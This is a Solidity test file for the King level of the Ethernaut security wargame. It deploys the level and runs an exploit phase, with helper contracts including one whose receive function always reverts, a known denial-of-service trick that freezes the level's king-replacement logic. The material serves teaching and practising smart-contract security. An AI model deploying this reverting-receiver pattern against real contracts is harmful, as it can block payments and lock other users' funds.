// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {King} from "../levels/King/King.sol";
import {KingFactory} from "../levels/King/KingFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract KingTest is LevelTest {
    King private level;

    constructor() {
        levelFactory = new KingFactory();
    }

    function testKing() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = King(levelAddress);

        assertEq(level._king(), address(levelFactory));
        assertEq(level.prize(), 0);
    }

    function exploit() internal override {
        vm.startPrank(player);

        // KingExploit2 expl2 = new KingExploit2(level);
        // expl2.run{value: 1 wei}();

        KingExploit1 expl1 = new KingExploit1();
        (new KingExploit1()).run(address(level));

        vm.stopPrank();
    }
}

contract KingExploit1 {
    function run(address _king) public payable {
        (bool success, ) = payable(_king).call{value: msg.value}("");
        require(success, "failed to send ether");
    }
}

contract KingExploit2 {
    address payable private immutable level;

    constructor(King _king) {
        level = payable(address(_king));
    }

    function run() public payable {
        (bool success, ) = level.call{value: msg.value}("");
        require(success, "failed to send ether");
    }

    receive() external payable {
        revert("muhahaha");
    }
}
